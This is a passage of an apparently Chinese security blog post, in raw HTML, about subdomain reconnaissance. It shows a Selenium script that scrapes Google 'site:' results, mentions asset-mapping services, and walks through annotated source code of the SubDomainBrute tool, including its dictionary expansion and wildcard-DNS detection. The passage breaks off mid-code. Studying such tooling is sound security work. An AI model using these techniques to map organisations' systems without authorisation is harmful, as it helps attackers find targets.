<span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># signal handler</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signal_handler</span>(<span class=\"params\">sig, frame</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nuser pause&quot;</span>)</span><br><span class=\"line\">    sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># init selenium</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setup_driver</span>():</span><br><span class=\"line\">    options = webdriver.ChromeOptions()</span><br><span class=\"line\">    options.add_argument(<span class=\"string\">&quot;--headless&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> webdriver.Chrome(options=options)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get domain in links</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">extract_domain</span>(<span class=\"params\">link</span>):</span><br><span class=\"line\">    <span class=\"keyword\">match</span> = re.search(<span class=\"string\">r&quot;https://(.*?)/&quot;</span>, link)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">match</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">match</span>.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fetch links from result</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fetch_links</span>(<span class=\"params\">driver, domain, page</span>):</span><br><span class=\"line\">    url = <span class=\"string\">f&quot;https://www.google.com/search?q=site:<span class=\"subst\">&#123;domain&#125;</span>&amp;start=<span class=\"subst\">&#123;page&#125;</span>0&quot;</span></span><br><span class=\"line\">    driver.get(url)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        elements = driver.find_elements(By.CSS_SELECTOR, <span class=\"string\">&quot;#rso .kb0PBd.A9Y9g.jGGQ5e span &gt; a&quot;</span>)</span><br><span class=\"line\">        links = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> element <span class=\"keyword\">in</span> elements:</span><br><span class=\"line\">            link = element.get_attribute(<span class=\"string\">&quot;href&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> link:</span><br><span class=\"line\">                links.append(link)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> links</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;failed to fetch links: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> []</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># main</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"comment\"># signal init</span></span><br><span class=\"line\">    signal.signal(signal.SIGINT, signal_handler)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># parse user input</span></span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">&quot;Chrome search script&quot;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&quot;-d&quot;</span>, <span class=\"string\">&quot;--domain&quot;</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&quot;The domain to search&quot;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&quot;-m&quot;</span>, <span class=\"string\">&quot;--maxpage&quot;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&quot;The maximum number to search&quot;</span>)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># parameter assignment</span></span><br><span class=\"line\">    domain = args.domain</span><br><span class=\"line\">    max_page = args.maxpage</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># init driver</span></span><br><span class=\"line\">    driver = setup_driver()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># remove duplicates</span></span><br><span class=\"line\">    unique_links = <span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Start crawling from the first page</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> page <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, max_page + <span class=\"number\">1</span>):</span><br><span class=\"line\">        links = fetch_links(driver, domain, page)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Traverse links, extract and save unique domain names</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> link <span class=\"keyword\">in</span> links:</span><br><span class=\"line\">            domain_name = extract_domain(link)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> domain_name <span class=\"keyword\">and</span> domain_name <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> unique_links:</span><br><span class=\"line\">                unique_links.add(domain_name)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(domain_name)</span><br><span class=\"line\">                write_file(<span class=\"string\">&quot;domain.txt&quot;</span>, domain_name)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># close driver</span></span><br><span class=\"line\">    driver.quit()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p><strong>资产测绘工具搜集</strong></p>\n<p>使用资产测绘工具收集，如<strong>fofa、hunter、360quake、微步</strong>等，包括使用站长之家等等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241122163631.png\" alt=\"img\"></p>\n<p><strong>使用自动化工具</strong></p>\n<p>这里对两种开源的工具进行源码分析，了解其原理</p>\n<h4 id=\"SubDomainBrute源码分析\"><a href=\"#SubDomainBrute源码分析\" class=\"headerlink\" title=\"SubDomainBrute源码分析\"></a><strong>SubDomainBrute源码分析</strong></h4><p>这里只分析主要代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 加载DNS服务器地址</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">load_dns_servers</span>():</span><br><span class=\"line\">    print_msg(<span class=\"string\">&#x27;[+] Validate DNS servers&#x27;</span>, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    dns_servers = []</span><br><span class=\"line\"></span><br><span class=\"line\">    servers_to_test = []</span><br><span class=\"line\">    <span class=\"comment\"># 从字典中加载未被注释的DNS服务器地址</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> server <span class=\"keyword\">in</span> <span class=\"built_in\">open</span>(os.path.join(root_path, <span class=\"string\">&#x27;dict/dns_servers.txt&#x27;</span>)).readlines():</span><br><span class=\"line\">        server = server.strip()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> server <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> server.startswith(<span class=\"string\">&#x27;#&#x27;</span>):</span><br><span class=\"line\">            servers_to_test.append(server)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 异步验证DNS服务器，dns_servers为传入的空列表，保存验证通过的DNS服务器地址</span></span><br><span class=\"line\">    loop = asyncio.get_event_loop()</span><br><span class=\"line\">    loop.run_until_complete(async_load_dns_servers(servers_to_test, dns_servers))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 打印有效DNS服务器地址</span></span><br><span class=\"line\">    server_count = <span class=\"built_in\">len</span>(dns_servers)</span><br><span class=\"line\">    print_msg(<span class=\"string\">&#x27;\\n[+] %s DNS Servers found&#x27;</span> % server_count, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> server_count == <span class=\"number\">0</span>:</span><br><span class=\"line\">        print_msg(<span class=\"string\">&#x27;[ERROR] No valid DNS Server !&#x27;</span>, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        sys.exit(-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dns_servers</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加载子域名爆破字典</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">load_next_sub</span>(<span class=\"params\">full_scan</span>):</span><br><span class=\"line\">    next_subs = []</span><br><span class=\"line\">    <span class=\"comment\"># 根据full_scan参数判断加载哪个字典</span></span><br><span class=\"line\">    _file = <span class=\"string\">&#x27;dict/next_sub_full.txt&#x27;</span> <span class=\"keyword\">if</span> full_scan <span class=\"keyword\">else</span> <span class=\"string\">&#x27;dict/next_sub.txt&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 将子域名去重后存入临时集合tmp_set</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(os.path.join(root_path, _file)) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">            sub = line.strip()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> sub <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> next_subs:</span><br><span class=\"line\">                tmp_set = &#123;sub&#125;</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 如果子域名模块包含占位符，如&#123;alphnum&#125;，则进行替换操作</span></span><br><span class=\"line\">                <span class=\"keyword\">while</span> tmp_set:</span><br><span class=\"line\">                    item = tmp_set.pop()</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> item.find(<span class=\"string\">&#x27;&#123;alphnum&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">&#x27;&#123;alphnum&#125;&#x27;</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item.find(<span class=\"string\">&#x27;&#123;alpha&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">&#x27;&#123;alpha&#125;&#x27;</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item.find(<span class=\"string\">&#x27;&#123;num&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">&#x27;0123456789&#x27;</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">&#x27;&#123;num&#125;&#x27;</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> next_subs:</span><br><span class=\"line\">                        next_subs.append(item)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> next_subs</span><br></pre></td></tr></table></figure>\n\n<p>加载字典的功能中，使用占位符的方式让这个工具更加灵活，字典文件更加通用，并且通过这个方式可以轻松生成大规模的子域名。</p>\n<p>在子域名中还存在一个<strong>泛解析</strong>的问题，这个工具里面解决了这个问题</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">async_wildcard_test</span>(<span class=\"params\">domain, dns_servers, level=<span class=\"number\">1</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 创建异步DNS解析器</span></span><br><span class=\"line\">        r = dns.asyncresolver.Resolver()</span><br><span class=\"line\">        <span class=\"comment\"># 使用DNS服务器解析域名</span></span><br><span class=\"line\">        r.nameservers = dns_servers</span><br><span class=\"line\">        <span class=\"comment\"># 使用异步DNS查询解析A记录，lijiejie-not-existed-test是一个随机的子域名，理论上不存在</span></span><br><span class=\"line\">        answers = <span class=\"keyword\">await</span> r.resolve(<span class=\"string\">&#x27;lijiejie-not-existed-test.%s&#x27;</span> % domain, <span class=\"string\">&#x27;A&#x27;</span>, lifetime=<span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 如果解析成功，讲这些IP手机在ips中，如果解析的IP有效，可能意味着域名启用了通配符解析</span></span><br><span class=\"line\">        ips = <span class=\"string\">&#x27;, &#x27;</span>.join(<span class=\"built_in\">sorted</span>([answer.address <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers]))</span><br><span class=\"line\">        <span class=\"comment\"># 初步检测，生成一个子域名，并递归调用进一步检测，并将level设置为2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> level == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;any-sub.%s\\t%s&#x27;</span> % (domain.ljust(<span class=\"number\">30</span>), ips))</span><br><span class=\"line\">            <span class=\"keyword\">await</span> async_wildcard_test(<span class=\"string\">&#x27;any-sub.%s&#x27;</span> % domain, dns_servers, <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 打印提示信息，使用-w参数强制扫描通配符域名</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> level == <span class=\"number\">2</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\nUse -w to enable force scan wildcard domain&#x27;</span>)</span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> domain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">wildcard_test</span>(<span class=\"params\">domain, dns_servers</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 获取当前的异步事件循环</span></span><br><span class=\"line\">    loop = asyncio.get_event_loop()</span><br><span class=\"line\">    <span class=\"comment\"># 等待异步任务完成</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> loop.run_until_complete(</span><br><span class=\"line\">        <span class=\"comment\"># 并行执行多个异步任务，并返回它们的结果</span></span><br><span class=\"line\">        asyncio.gather(</span><br><span class=\"line\">            async_wildcard_test(domain, dns_servers, level=<span class=\"number\">1</span>)</span><br><span class=\"line\">        )</span><br><span class=\"line\">    )[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n\n<p>通过给出一个不存在的域名检测，判断是否开启了泛解析</p>\n<p>接下来看看扫描模块</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 爆破模块</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SubNameBrute</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 初始化</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, *params</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 提取传入参数</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.domain, <span class=\"variable language_\">self</span>.options, <span class=\"variable language_\">self</span>.process_num, <span class=\"variable language_\">self</span>.dns_servers, <span class=\"variable language_\">self</span>.next_subs, \\</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count, <span class=\"variable language_\">self</span>.found_count, <span class=\"variable language_\">self</span>.queue_size_array, tmp_dir = params</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.dns_count = <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.dns_servers)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.scan_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.found_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"comment\"># 初始化DNS解析器</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.resolvers = [dns.asyncresolver.Resolver(configure=<span class=\"literal\">False</span>) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"variable language_\">self</span>.options.threads)]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> r <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.resolvers:</span><br><span class=\"line\">            <span class=\"comment\"># 解析事件</span></span><br><span class=\"line\">            r.lifetime = <span class=\"number\">6.0</span></span><br><span class=\"line\">            <span class=\"comment\"># 超时时间</span></span><br><span class=\"line\">            r.timeout = <span class=\"number\">10.0</span></span><br><span class=\"line\">        <span class=\"comment\"># 优先队列和状态变量</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.queue = PriorityQueue()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.ip_dict = &#123;&#125;</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.found_subs = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.cert_subs = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.timeout_subs = &#123;&#125;</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.no_server_subs = &#123;&#125;</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.count_time = time.time()</span><br><span class=\"line\">        <span class=\"comment\"># 输出日志到文件</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.outfile = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;%s/%s_part_%s.txt&#x27;</span> % (tmp_dir, <span class=\"variable language_\">self</span>.domain, <span class=\"variable language_\">self</span>.process_num), <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.normal_names_set = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.lock = asyncio.Lock()</span><br><span class=\"line\">        <span class=\"comment\"># 线程状态</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.threads_status = [<span class=\"string\">&#x27;1&#x27;</span>] * <span class=\"variable language_\">self</span>.options.threads</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 加载子域名字典</span></span><br><span 